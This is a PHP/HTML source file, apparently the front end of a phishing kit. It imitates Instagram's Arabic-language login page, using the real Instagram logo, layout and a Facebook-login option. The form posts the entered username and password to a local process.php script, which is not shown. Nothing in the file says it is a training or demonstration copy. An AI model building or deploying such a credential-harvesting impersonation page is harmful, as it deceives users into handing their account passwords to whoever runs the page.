<?php
// بدء الجلسة
session_start();

// إذا كان المستخدم قد أرسل النموذج مسبقاً
$error = isset($_SESSION['error']) ? $_SESSION['error'] : '';
unset($_SESSION['error']);
?>
<!DOCTYPE html>
<html lang="ar" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول • Instagram</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <div class="login-box">
            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" class="logo">
            
            <?php if (!empty($error)): ?>
                <div class="error-message"><?php echo htmlspecialchars($error); ?></div>
            <?php endif; ?>
            
            <form action="process.php" method="POST" id="loginForm">
                <div class="form-group">
                    <input type="text" id="username" name="username" placeholder="اسم المستخدم أو البريد الإلكتروني" required>
                </div>
                <div class="form-group">
                    <div class="password-container">
                        <input type="password" id="password" name="password" placeholder="كلمة المرور" required>
                        <span class="toggle-password" id="togglePassword">إظهار</span>
                    </div>
                </div>
                <button type="submit" id="loginButton">تسجيل الدخول</button>
            </form>
            
            <div class="divider">أو</div>
            
            <div class="facebook-login">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
                    <path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z"/>
                </svg>
                تسجيل الدخول باستخدام فيسبوك
            </div>
            
            <a href="#" class="forgot-password">هل نسيت كلمة المرور؟</a>
        </div>
        
        <div class="signup-box">
            ليس لديك حساب؟ <a href="#">اشترك</a>
        </div>
    </div>

    <script>
        // تبديل إظهار/إخفاء كلمة المرور
        document.getElementById('togglePassword').addEventListener('click', function() {
            const passwordInput = document.getElementById('password');
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                this.textContent = 'إخفاء';
            } else {
                passwordInput.type = 'password';
                this.textContent = 'إظهار';
            }
        });
    </script>
</body>
</html>